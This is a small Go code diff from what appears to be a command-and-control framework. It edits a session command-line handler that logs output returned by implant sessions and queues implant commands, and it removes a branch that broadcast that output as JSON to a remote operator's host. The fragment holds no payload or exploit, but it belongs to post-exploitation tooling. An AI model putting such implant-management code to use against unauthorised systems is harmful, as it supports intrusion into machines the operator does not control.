@@ -133,12 +133,7 @@ func InitializeSessionCLI(sessionApp *grumble.App, activeSession int) {
 				core.LogData("Session " + strconv.Itoa(activeSession) + " returned:\n" + data)
 				if operator == "server" {
 					fmt.Println("\nSession " + strconv.Itoa(activeSession) + " returned:\n" + data)
-				} else {
-					currentWolf := core.Wolves[operator]
-					jsonData := `{"data":"` + data + `"}`
-					core.AssignWolfBroadcast(currentWolf.Username, currentWolf.Rhost, jsonData)
 				}
-
 			} else {
 				core.QueueImplantCommand(activeSession, cmdString, "server")
 			}
